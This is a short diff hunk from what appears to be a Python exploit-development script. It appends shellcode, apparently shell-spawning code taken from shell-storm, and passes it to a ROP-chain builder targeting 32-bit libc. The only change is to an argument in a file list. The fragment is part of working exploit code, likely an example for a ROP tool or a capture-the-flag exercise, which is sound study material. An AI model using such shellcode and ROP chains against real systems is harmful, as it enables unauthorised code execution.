@@ -21,7 +21,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-827.php
  +  "\xcd\x80"              # int    0x80
 )
 
-files = [(filename, None, 0)]
+files = [(filename, None, None)]
 libs = ['/lib/i386-linux-gnu/libc.so.6']
 rop = ropme.rop(files, libs, [["shellcode_hex", binascii.hexlify(shellcode)]], arch = arch, log_level = logging.DEBUG)
 
